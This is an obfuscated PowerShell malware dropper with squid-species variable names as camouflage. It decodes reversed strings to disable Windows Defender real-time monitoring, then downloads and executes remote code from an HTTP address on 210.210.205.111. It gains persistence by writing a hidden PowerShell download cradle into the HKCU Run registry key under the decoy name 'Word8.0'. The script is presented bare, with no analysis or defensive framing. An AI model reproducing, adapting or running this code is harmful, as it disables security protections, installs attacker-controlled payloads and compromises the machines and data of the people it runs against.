﻿function Histioteuthis_reversa($s) {
    $chars = $s.ToCharArray()
    [array]::Reverse($chars)
    return -join $chars
}
function Vampyroteuthis-infernalis($s) {
    return $s.Replace('#d#','"').Replace('#b#','$').Replace('#c#','`')
}
$Teuthowenia_pellucida="eurt$ gnirotinoMemitlaeRelbasiD- ecnereferPpM-teS"
iex(Histioteuthis_reversa $Teuthowenia_pellucida)
$Watasenia_scintillans = 'z1mcvZ0UN9CM4oTMxEjL1AjMuATMy4CMxIzLvoDc0RHa'
$Dosidicus_gigas = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String((Histioteuthis_reversa $Watasenia_scintillans))
)
iex ((New-Object Net.WebClient).DownloadString($Dosidicus_gigas))
$Sepia_latimanus = "powershell -NoP -W Hidden -c #d#iex ((New-Object Net.WebClient).DownloadString(#d#http://210.210.205.111:80/MSForms#d#)#d#"
$Loligo_vulgaris = $Sepia_latimanus -replace '\$', '#b#' -replace '#d#','"'
$Galiteuthis_armata = $Loligo_vulgaris
$Ommastrephes_bartramii = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$Mastigoteuthis_agassizii = 'Word8.0'
Set-ItemProperty -Path $Ommastrephes_bartramii -Name $Mastigoteuthis_agassizii -Value $Galiteuthis_armata